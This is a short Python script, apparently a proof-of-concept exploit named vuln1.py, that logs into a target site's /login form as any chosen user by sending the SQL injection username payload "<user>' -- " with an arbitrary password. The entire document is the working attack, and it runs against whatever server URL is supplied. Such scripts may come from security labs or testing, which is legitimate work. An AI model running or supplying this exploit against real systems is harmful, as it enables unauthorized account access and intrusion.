import requests, sys, os, random

if (len(sys.argv) < 3):
    print('Correct usage: python3 vuln1.py <link> <username>')
    quit()

SERVER = sys.argv[1]
USER = sys.argv[2]

session = requests.session()

user = "%s' -- " % (USER)
password = "any"

params = {'username': user, 'password': password}
r = session.post(SERVER + '/login', data=params)

assert USER in r.text
